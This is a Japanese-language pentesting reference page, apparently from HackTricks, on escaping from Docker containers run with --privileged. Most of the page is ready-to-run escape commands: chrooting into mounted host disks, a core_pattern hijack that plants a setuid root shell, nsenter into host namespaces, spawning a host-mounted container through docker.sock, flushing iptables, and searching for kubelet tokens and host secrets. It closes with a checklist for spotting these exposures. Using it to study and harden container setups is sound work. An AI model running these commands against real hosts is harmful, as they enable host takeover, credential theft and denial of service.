# `--privileged` コンテナからの Escape

{{#include ../../../banners/hacktricks-training.md}}

## 概要

`--privileged` で起動したコンテナは、権限が1つか2つ追加されただけの通常のコンテナとは異なります。実際には、`--privileged` によって、ワークロードを危険なホストリソースから通常隔離しているデフォルトのランタイム保護が複数削除または弱体化されます。正確な効果はランタイムとホストに依存しますが、Docker では通常、次のようになります。

- すべての capabilities が付与される
- device cgroup の制限が解除される
- 多くの kernel filesystem が read-only でマウントされなくなる
- デフォルトで masked になっている procfs のパスが表示される
- seccomp filtering が無効になる
- AppArmor confinement が無効になる
- SELinux isolation が無効になるか、はるかに広範な label に置き換えられる

重要な点は、privileged コンテナでは通常、巧妙な kernel exploit が**必要ない**ということです。多くの場合、ホストデバイス、ホストに接続された kernel filesystem、または runtime interface に直接アクセスし、その後 host shell へ pivot できます。

## `--privileged` が自動的には変更しないもの

`--privileged` は、ホストの PID、network、IPC、または UTS namespace に自動的に参加するわけではありません。privileged コンテナにも、private namespace が存在する場合があります。つまり、一部の escape chain には次のような追加条件が必要です。

- host bind mount
- host PID sharing
- host networking
- 表示される host device
- writable な proc/sys interface

このような条件は、実際の misconfiguration では簡単に満たされることが多いものの、概念的には `--privileged` 自体とは別のものです。

## Escape Paths

### 1. Exposed Devices 経由で Host Disk をマウントする

privileged コンテナでは、通常 `/dev` 配下にさらに多くの device node が表示されます。ホストの block device が表示される場合、最も簡単な escape は、それをマウントして `chroot` で host filesystem に入ることです。
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
root パーティションが明確でない場合は、まずブロックレイアウトを列挙します:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
実用的な方法として、`chroot` するのではなく書き込み可能なホストマウントに `setuid` ヘルパーを配置する場合は、すべてのファイルシステムが setuid ビットに対応しているわけではないことを覚えておいてください。ホスト側で簡単に機能を確認する方法は次のとおりです。
```bash
mount | grep -v "nosuid"
```
これは、`nosuid` ファイルシステム下の書き込み可能なパスが、従来の「setuid シェルを配置して後で実行する」ワークフローではあまり重要でなくなるため有用です。

ここで悪用されている、弱体化した保護機能は次のとおりです。

- デバイスへの完全なアクセス
- 広範な capabilities、特に `CAP_SYS_ADMIN`

関連ページ:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Host の Bind Mount をマウントまたは再利用して `chroot`

Host の root ファイルシステムがすでにコンテナ内にマウントされている場合、またはコンテナが privileged であるため必要な mount を作成できる場合、Host shell の取得は多くの場合 `chroot` を1回実行するだけです。
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
ホスト root bind mount が存在しないものの、ホストストレージに到達可能な場合は、作成します:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
This path は以下を悪用します:

- 弱体化した mount restrictions
- 完全な capabilities
- MAC confinement の欠如

関連ページ:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Writable `/proc/sys` または `/sys` の悪用

`--privileged` の大きな影響の1つは、procfs と sysfs の保護が大幅に弱くなることです。その結果、通常は mask されているか read-only で mount されている、host に接続する kernel interface が露出する可能性があります。

典型的な例が `core_pattern` です:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
その他のhigh-valueなパスには、次のものがあります：
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
この手法は以下を悪用します。

- masked paths の欠如
- read-only system paths の欠如

関連ページ：

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Mount または Namespace ベースの Escape に Full Capabilities を使用する

privileged container には、通常の container から削除されている capabilities が付与されます。これには `CAP_SYS_ADMIN`、`CAP_SYS_PTRACE`、`CAP_SYS_MODULE`、`CAP_NET_ADMIN` などが含まれます。別の露出した surface が存在すれば、これだけでローカル foothold を host escape に変えるのに十分なことがよくあります。

簡単な例として、追加の filesystem を mount し、namespace entry を使用します。
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
ホストの PID も共有されている場合、手順はさらに短くなります。
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
この手法は、以下を悪用します。

- デフォルトの privileged capability set
- オプションのホスト PID 共有

関連ページ：

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Runtime Sockets 経由での Escape

privileged container では、ホストの runtime state や socket が見える状態になることがよくあります。Docker、containerd、または CRI-O の socket に到達できる場合、最も簡単な方法は、runtime API を使用してホストアクセス権を持つ 2 つ目の container を起動することです。
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
containerd の場合:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
この手法では、以下を悪用します。

- privileged runtime exposure
- runtime 自体を介して作成された host bind mounts

関連ページ：

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Network Isolation の副作用を排除する

`--privileged` だけでは host network namespace に参加しませんが、コンテナに `--network=host` やその他の host-network access もある場合、ネットワークスタック全体が変更可能になります：
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
これは常に直接的な host shell につながるとは限りませんが、denial of service、traffic interception、または loopback 限定の管理サービスへのアクセスを可能にする場合があります。

関連ページ:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Host Secrets と Runtime State の読み取り

clean な shell escape がすぐに実行できない場合でも、privileged containers は多くの場合、host secrets、kubelet state、runtime metadata、および隣接する container の filesystems を読み取るのに十分なアクセス権を持っています:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
`/var` がホストにマウントされている、またはランタイムディレクトリが可視になっている場合、ホスト shell を取得する前であっても、これだけで lateral movement や cloud/Kubernetes credential theft が可能になることがあります。

関連ページ:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Checks

以下のコマンドの目的は、どの privileged-container escape の種類が直ちに実行可能かを確認することです。
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
ここで注目すべき点:

- 完全な capability セット、特に `CAP_SYS_ADMIN`
- 書き込み可能な proc/sys の公開
- ホストデバイスが見えている
- seccomp と MAC confinement がない
- runtime sockets またはホストの root bind mounts

これらのいずれか1つだけでも post-exploitation には十分な場合があります。複数が同時に存在する場合、通常はコンテナからホストを compromise するまで、実質的に1〜2コマンドしか必要ありません。

## 関連ページ

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
